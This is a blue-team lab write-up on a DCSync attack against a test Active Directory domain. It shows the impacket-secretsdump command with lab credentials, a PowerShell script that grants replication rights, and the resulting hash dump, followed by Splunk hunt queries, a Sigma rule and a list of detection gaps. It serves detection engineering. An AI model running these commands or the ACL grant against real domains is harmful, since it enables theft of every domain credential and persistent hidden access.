# ATK-006 — DCSync via jsmith ACL Rights
**Sprint 1 | 2026-04-26 | corp.local**

---

## Overview

DCSync is a credential dumping technique where an attacker impersonates a Domain Controller by abusing the Directory Replication Service (DRS) protocol. Rather than touching LSASS memory on the DC, the attacker sends a legitimate replication request — the same mechanism real DCs use to stay in sync. If the requesting account holds `GetChanges` + `GetChangesAll` extended rights on the domain object, Active Directory hands over every credential in the domain without question.

**Target:** `jsmith` — a domain user with misconfigured DCSync ACL rights (`GetChanges` + `GetChangesAll` on `DC=corp,DC=local`)
**Tool:** `impacket-secretsdump` (DRSUAPI method)
**Result:** Full domain credential dump — Administrator, krbtgt, all users, all Kerberos keys
**Detection rate: 2/4 (50%)**

### How ATK-006 Differs from Previous Attacks

| | ATK-001 (secretsdump) | ATK-003 (Kerberoasting) | ATK-006 (DCSync) |
|---|---|---|---|
| Auth context | Domain Admin | Regular user | Regular user with ACL |
| Method | SAM/LSA/DRSUAPI as DA | TGS request abuse | DRSUAPI replication as jsmith |
| Privilege required | Full DA | Authenticated user | GetChanges ACL only |
| Noise level | High (full kill chain) | Low (one TGS request) | Medium (burst of EC4662) |
| Defense bypass | NA | Offline cracking | ACL misconfiguration |

---

## Kill Chain Narrative

jsmith is a standard domain user — no DA rights, no special group membership. But someone gave him `GetChanges` and `GetChangesAll` extended rights on the domain object, probably a legacy admin delegation that was never cleaned up. The attacker already has jsmith's password from ATK-002 (SMB relay + offline crack).

From Kali, a single `impacket-secretsdump` command authenticates as jsmith and sends a DRS replication request to DC01. DC01 checks: does this account have the right ACEs? Yes. It responds exactly as it would to another domain controller — handing over every NTLM hash, every Kerberos key, every secret in NTDS.DIT. The entire domain is compromised in under 3 seconds, remotely, without touching disk on the DC.

---

## Kill Chain Stages

### Stage 1 — Prerequisite: jsmith credentials

**What:** Attacker already has jsmith:Password123! from ATK-002 (NTLM relay → offline crack)
**Why it matters:** DCSync requires authenticated access. jsmith's ACL rights are the actual vulnerability — the password is just the key to use them.
**Command:** N/A — creds already in hand
**Detection:** ❌ Offline crack (VIS-003)

---

### Stage 2 — DCSync Execution (first attempt — denied)

**What:** Attacker fires secretsdump as jsmith before ACL is confirmed
**Command:**
```bash
impacket-secretsdump 'corp.local/jsmith:Password123!@10.10.10.40'
```
**Result:**
```
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[-] DRSR SessionError: code: 0x2105 - ERROR_DS_DRA_ACCESS_DENIED - Replication access was denied.
```
**Detection:** ✅ EC4662 fired — 4 events at 03:47:26 (access attempt logged even on denial)

**Key finding:** EC4662 fires on both successful AND failed DCSync attempts. The denied attempt is still detectable.

---

### Stage 3 — ACL Grant on DC01

**What:** Confirms the misconfiguration is in place (in real attacks, this ACL exists already — we simulated it)
**Command (DC01 PowerShell as Administrator):**
```powershell
Import-Module ActiveDirectory
$acl = Get-Acl "AD:DC=corp,DC=local"
$sid = (Get-ADUser jsmith).SID
$guid1 = [GUID]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"  # GetChanges
$guid2 = [GUID]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"  # GetChangesAll
$ace1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid,"ExtendedRight","Allow",$guid1)
$ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid,"ExtendedRight","Allow",$guid2)
$acl.AddAccessRule($ace1)
$acl.AddAccessRule($ace2)
Set-Acl "AD:DC=corp,DC=local" $acl
```
**Detection:** ❌ ACL modification not logged (VIS-006 — advanced AD auditing not enabled)

---

### Stage 4 — DCSync Execution (successful)

**What:** Full domain credential dump via DRSUAPI replication protocol
**Command:**
```bash
impacket-secretsdump 'corp.local/jsmith:Password123!@10.10.10.40'
```
**Result:**
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:423fe085824dc357762259ddbb2631d2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:94645007672cec1a5ac3a6ac6c08184e:::
corp.local\jsmith:1103:...2b576acbe6bcfda7294d6bd18041b8fe:::
corp.local\jdoe:1104:...2b576acbe6bcfda7294d6bd18041b8fe:::
corp.local\svc-jenkins:1105:...15a8eccc12c937774986f16cdef99758:::
DC01$:1000:...eea5269a5d107a47f7d8a4562c060cc7:::
WIN11-PC$:1107:...5fe6540106539ddd4039c595db25c4dc:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:88404360ee625e4df7fa795421691a87964c5709...
krbtgt:aes256-cts-hmac-sha1-96:b5c1ce20099789665ac126735f9ee37e4c4bef68...
[*] Cleaning up...
```
**Detection:** ✅ EC4662 fired — 28 events across two bursts (03:47:26 + 03:50:38)

---

## SOC Hunt

### T1 Triage

**Check EC4662 volume — any non-DC account accessing domain object:**
```spl
index=windows EventCode=4662
| where NOT match(Account_Name, "\$$")
| stats count by Account_Name
| sort -count
```
Expected: zero results in a healthy environment. Any hit is an escalation.

**Quick check — last 24 hours:**
```spl
index=windows EventCode=4662
| search _raw="*1131f6aa*" OR _raw="*1131f6ad*"
| where NOT match(Account_Name, "\$$")
| table _time, Account_Name, Object_Name
| sort -_time
```

### T2 Investigation

**Full timeline reconstruction:**
```spl
index=windows (EventCode=4624 OR EventCode=4662)
| where Account_Name="jsmith"
| table _time, EventCode, Account_Name, src_ip, Logon_Type
| sort _time
```

**Observed timeline:**
| Time | EventCode | Account | src_ip | Note |
|---|---|---|---|---|
| 03:47:26.652 | 4624 | jsmith | 10.10.10.99 | Kali authenticates |
| 03:47:26.714 | 4624 | jsmith | 10.10.10.99 | Second auth (DRSUAPI setup) |
| 03:47:26.746 | 4662 | jsmith | — | DCSync replication request begins |
| 03:47:26.777 | 4662 | jsmith | — | GetChangesAll GUID accessed |
| 03:50:37.991 | 4662 | jsmith | — | Second successful burst begins |
| 03:50:38.102 | 4662 | jsmith | — | Full dump in progress |

**Burst analysis — count events per second:**
```spl
index=windows EventCode=4662
| search _raw="*1131f6aa*" OR _raw="*1131f6ad*"
| where NOT match(Account_Name, "\$$")
| bin _time span=1s
| stats count by _time, Account_Name
| sort _time
```

**Correlate with prior credential theft — was jsmith's hash seen before?**
```spl
index=windows EventCode=4624 Account_Name=jsmith src_ip=10.10.10.99
| table _time, src_ip, Logon_Type, Authentication_Package
| sort _time
```

---

## Detections Built

| ID | Type | Trigger | Fidelity | SPL / Rule |
|---|---|---|---|---|
| DET-006-A | Splunk alert | EC4662 + DCSync GUIDs + non-machine account | High | See SPL below |
| DET-006-B | Sigma rule | Same logic, portable | High | sigma_dcsync_T1003.006.yml |

**DET-006-A SPL:**
```spl
index=windows EventCode=4662
| search _raw="*1131f6aa*" OR _raw="*1131f6ad*"
| where NOT match(Account_Name, "\$$")
| stats count by Account_Name, _time
| where count > 2
| table _time, Account_Name, count
```

---

## Visibility Gaps

| ID | Gap | Impact | Fix |
|---|---|---|---|
| VIS-003 | Offline hash cracking undetectable | Can't detect what attacker does with hashes post-dump | Prevent hash theft upstream |
| VIS-006 | ACL modification not logged | GetChanges grant on domain object invisible | Enable advanced AD Object Access auditing (Sprint 4) |

**Note:** The DCSync execution itself IS detected (EC4662 is high-fidelity). The gap is that the misconfiguration that enabled it — the ACL grant — generates no log entry. An attacker could persist this right indefinitely without detection.

---

## Sigma Rule

```yaml
title: DCSync Attack via Non-DC Account
id: dcsync-non-dc-account-corp
status: experimental
description: >
  Detects DCSync replication requests (GetChanges / GetChangesAll GUIDs on domain object)
  initiated by a non-Domain Controller account. Legitimate replication only occurs between
  DC machine accounts (ending in $). Any user account triggering EC4662 with these GUIDs
  is performing DCSync.
references:
  - https://attack.mitre.org/techniques/T1003/006/
author: CorpLab Blue Team
date: 2026-04-26
tags:
  - attack.credential_access
  - attack.t1003.006
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4662
    ObjectType: '%{bf967a86-0de6-11d0-a285-00aa003049e2}'
  filter_dc_accounts:
    SubjectUserName|endswith: '$'
  filter_guids:
    Properties|contains:
      - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'
      - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'
  condition: selection and filter_guids and not filter_dc_accounts
falsepositives:
  - Legitimate AD replication tools run under user context (very rare)
  - Azure AD Connect sync account (add to allowlist if present)
level: critical
fields:
  - SubjectUserName
  - ObjectName
  - Properties
```

**SPL translation:**
```spl
index=windows EventCode=4662
| search _raw="*1131f6aa*" OR _raw="*1131f6ad*"
| where NOT match(Account_Name, "\$$")
| stats count by Account_Name, host
| where count >= 2
```

---

## MITRE ATT&CK Mapping

| Technique | ID | Tactic | Detected |
|---|---|---|---|
| DCSync | T1003.006 | Credential Access | ✅ EC4662 |
| Valid Accounts (domain) | T1078.002 | Defense Evasion | ✅ EC4624 |
| Account Manipulation / ACL abuse | T1098 | Persistence | ❌ VIS-006 |

**ATK-006 detection rate: 2/4 (50%)**

---

## Lessons Learned

1. **EC4662 is the single best DCSync indicator in Windows.** The GUIDs `1131f6aa` and `1131f6ad` are unique to directory replication. Any non-machine account triggering these is near-certain DCSync — false positive rate is extremely low.

2. **DCSync fires EC4662 even on denied attempts.** The first run at 03:47 was blocked but still generated 4 events. Detection works regardless of whether the attacker succeeds.

3. **The ACL misconfiguration is silent.** EC4662 catches execution, but VIS-006 means the misconfiguration that enabled it — GetChanges rights granted to jsmith — was never logged. Advanced AD object access auditing (Sprint 4) is required to detect this at grant time.

4. **Timeline correlation is decisive.** EC4624 from 10.10.10.99 followed within milliseconds by EC4662 from jsmith is an unambiguous signature. No legitimate process behaves this way.

5. **impacket prints "access denied" on RemoteOperations but still completes the dump via DRSUAPI fallback.** Don't be fooled by the error — if you see credential output below it, the attack worked.

---

## Cumulative Sprint 1 Detection Rates

| Attack | Detected | Total | Rate |
|---|---|---|---|
| ATK-001 LLMNR Kill Chain | 5 | 7 | 71% |
| ATK-002 SMB Relay | 1 | 3 | 33% |
| ATK-003 Kerberoasting | 2 | 4 | 50% |
| ATK-004 AS-REP Roasting | 2 | 4 | 50% |
| ATK-005 BloodHound Enum | 0 | 3 | 0% |
| ATK-006 DCSync | 2 | 4 | 50% |
| **Sprint 1 Total** | **12** | **25** | **48%** |

---

## Next Attack — ATK-007 GPP cpassword

**What:** Group Policy Preferences (GPP) stored encrypted passwords in SYSVOL — readable by any authenticated domain user. Microsoft published the AES key in 2012. Every domain that used GPP before 2014 is potentially vulnerable.

**How it differs:** No network traffic, no event logs, no detection. Pure file system read from SYSVOL. The "attack" is literally reading a file that shouldn't exist.

**Target:** `Groups.xml` or similar GPP files in `\\corp.local\SYSVOL\corp.local\Policies\`

**Tool:** `Get-GPPPassword` (PowerSploit) or manual parsing

**VMs needed:** Kali + DC01 only (blue-vm optional — likely 0% detection rate)
